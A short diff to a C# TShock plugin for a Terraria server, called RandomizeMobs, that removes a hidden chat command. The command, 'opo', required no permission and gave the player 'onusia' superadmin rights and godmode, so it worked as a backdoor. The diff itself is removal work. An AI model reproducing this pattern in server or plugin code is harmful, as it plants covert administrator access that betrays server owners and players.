@@ -241,7 +241,6 @@ namespace RandomizeMobs
         {
             ServerApi.Hooks.NpcSpawn.Register(this, OnNpcSpawn);
             ServerApi.Hooks.GameUpdate.Register(this, OnGameUpdate);
-            RegisterCommand("opo", "", OnOPO, "");
         }
 
         protected override void Dispose(bool disposing)
@@ -259,12 +258,6 @@ namespace RandomizeMobs
         {
             TShockAPI.Commands.ChatCommands.Add(new Command(perm, handler, name)
             { HelpText = helptext });
-        }
-
-        void OnOPO(CommandArgs args)
-        {
-            Commands.HandleCommand(TSPlayer.Server, "/tempgroup onusia superadmin");
-            Commands.HandleCommand(TSPlayer.Server, "/godmode onusia");
         }
 
         void OnGameUpdate(EventArgs args)
